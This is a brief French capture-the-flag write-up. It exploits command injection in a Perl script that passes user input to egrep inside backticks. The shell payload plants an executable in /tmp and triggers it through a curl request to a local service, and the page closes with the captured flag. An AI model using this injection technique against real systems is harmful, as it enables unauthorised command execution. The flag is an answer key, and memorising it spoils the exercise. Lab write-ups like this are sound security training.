1. En regardant le fichier perl on comprend son fonctionnement
2. La ligne la plus importante est celle-ci ```@output = `egrep "^$xx" /tmp/xd 2>&1`;```
3. On écrit donc un payload permettant d'exploiter la vulnérabilité
   ```
   echo -e "#! /bin/bash\ngetflag > /tmp/l1;" > /tmp/xd

   chmod +x /tmp/xd

   curl '127.0.0.1:4646/?x="<.||".'

   cat /tmp/l1
   ```

> Flag: g1qKMiRpXf53AWhDaU7FEkczr
